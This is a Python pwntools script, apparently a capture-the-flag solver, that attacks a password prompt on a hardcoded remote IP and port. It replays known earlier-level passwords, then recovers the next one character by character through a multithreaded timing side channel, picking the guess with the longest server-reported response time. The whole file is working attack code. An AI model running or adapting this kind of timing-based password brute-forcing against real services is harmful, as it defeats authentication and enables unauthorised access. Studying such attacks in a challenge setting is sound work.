from pwn import *
import string
import re
import threading
from queue import Queue

# Configuration
host = '20.244.33.146'
port = 4445
charset = string.ascii_lowercase
context.log_level = 'error'
known_passwords = ['SloppyTOPPYWIThAtWIST', 'gingerdangerhermoinegranger', 'hickerydickerydockskibididobdobpop', 'snickersnortsupersecureshortshakingsafarisadistic', 'boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop']
time_increment = 0.0095  # Adjust based on the observed behavior for the correct characters
batch_size = 13
def worker(guess_queue, result_queue, level):
    while not guess_queue.empty():
        char, current_guess = guess_queue.get()
        context.log_level = 'error'
        try:
            conn = remote(host, port, timeout=5)
            for password in known_passwords[:level-1]:
                if password == 'boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop':
                    conn.recvuntil(b'Enter password: ')
                    conn.sendline(password.encode())
                    print(conn.recvall(timeout=5))
                conn.recvuntil(b'Enter password: ')
                conn.sendline(password.encode())
            conn.recvuntil(b'Enter password: ')
            conn.sendline(current_guess.encode())
            response = conn.recvall(timeout=5).decode()
            conn.close()

            match = re.search(r'Time taken:\s+([\d\.e-]+)', response)
            response_time = float(match.group(1)) if match else 0.0
            if "Incorrect password" not in response:  # Replace with the actual success message
                result_queue.put(('success', char))
                return
            
            print(f"Testing {current_guess}, Time: {response_time}")
            result_queue.put((char, response_time))
        except EOFError:
            print(f"Connection closed by server during {current_guess}.")
        finally:
            guess_queue.task_done()

def guess_password(level):
    password = ''

    while True:
        guess_queue = Queue()
        result_queue = Queue()
        for char in charset:
            guess_queue.put((char, password + char))

        threads = [threading.Thread(target=worker, args=(guess_queue, result_queue, level)) for _ in range(min(batch_size, len(charset)))]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        max_time = 0.0
        next_char = ''
        while not result_queue.empty():
            result = result_queue.get()
            if result[0] == 'success':
                print(f"Correct password found: {password + result[1]}")
                return password + result[1]
            elif result[1] > max_time:
                max_time = result[1]
                next_char = result[0]


        if next_char:
            password += next_char
            print(f"Testing {next_char}, Time: {max_time}")
            print(f"Level {level} password guess: {password}")
        else:
            break  # No character found with a longer response time, assuming password complete

    return password

if __name__ == '__main__':
    level = 6  # Adjust the level accordingly
    guessed_password = guess_password(level)
    print(f"Final password for level {level}: {guessed_password}")
